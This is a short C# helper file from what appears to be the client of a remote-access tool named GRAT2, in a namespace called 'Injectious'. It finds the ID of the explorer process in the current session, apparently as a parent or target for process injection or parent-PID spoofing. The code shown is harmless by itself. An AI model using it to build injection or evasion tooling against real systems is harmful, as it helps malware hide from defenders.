using System;
using System.Diagnostics;

namespace GRAT2_Client.Injectious
{
    class SearchPID
    {
        public static int SearchForPPID()
        {
            string process = "explorer";
            int pid = 0;
            int session = Process.GetCurrentProcess().SessionId;
            Process[] allprocess = Process.GetProcessesByName(process);

            try
            {
                foreach (Process proc in allprocess)
                {
                    if (proc.SessionId == session)
                    {
                        pid = proc.Id;
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return pid;
        }
    }
}
